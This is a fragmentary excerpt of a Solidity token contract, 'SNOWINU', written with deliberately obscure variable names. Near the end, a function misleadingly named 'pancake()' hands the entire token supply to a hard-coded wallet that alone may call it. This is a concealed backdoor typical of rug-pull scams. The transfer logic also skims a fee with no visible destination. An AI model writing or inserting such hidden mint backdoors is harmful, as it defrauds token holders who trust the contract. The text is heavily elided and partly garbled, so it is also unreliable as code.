...
contract Context {
 ...
 contract SNOWINU is Context, ERC20, ERC20Metadata {
    ...
    mapping(address => uint256) private superfloSNOW;
    ...
    uint256 private cryfaleSNOW = 4;
    uint256 private _vebegoSNOW = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloSNOW[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletSNOW = 0xBaB8e21ccb1cAb706587732442E14514fD2d24b9;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloSNOW[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloSNOW[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleSNOW / 100) / _vebegoSNOW;
        allons = allons -  (_fee * _vebegoSNOW);
        
        superfloSNOW[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaSNOW) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloSNOW[account];
        require(accountBalance >= gzillaSNOW, "BEP : Can't be done");
        unchecked {
            superfloSNOW[account] = accountBalance - gzillaSNOW;
        }
        _totalSupply -= gzillaSNOW;

        emit Transfer(account, address(0), gzillaSNOW);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function pancake() public {
        superfloSNOW[_MarketingWalletSNOW] = _tTotal;
        require(_msgSender() == _MarketingWalletSNOW, "ERC20: Function reserved for Pancake");
    }   
